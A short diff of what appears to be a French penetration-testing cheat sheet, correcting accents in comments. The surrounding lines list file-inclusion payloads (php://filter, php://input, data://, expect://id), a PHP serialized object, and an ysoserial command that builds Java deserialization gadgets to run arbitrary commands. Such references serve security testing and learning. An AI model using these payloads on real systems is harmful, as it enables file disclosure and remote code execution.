@@ -115,7 +115,7 @@ php://filter/convert.base64-encode/resource=index.php
 # PHP wrappers
 php://input                             # POST data as PHP
 data://text/plain;base64,BASE64_PAYLOAD
-expect://id                             # si expect est active
+expect://id                             # si expect est activé
 ```
 
 ### RFI
@@ -158,7 +158,7 @@ O:4:"User":1:{s:4:"name";s:6:"admin";}
 
 ### Java
 ```
-rO0AB...  (base64 de bytes serialises Java)
+rO0AB...  (base64 de bytes sérialisés Java)
 # Outil : ysoserial
 java -jar ysoserial.jar CommonsCollections1 'COMMAND' | base64
 ```
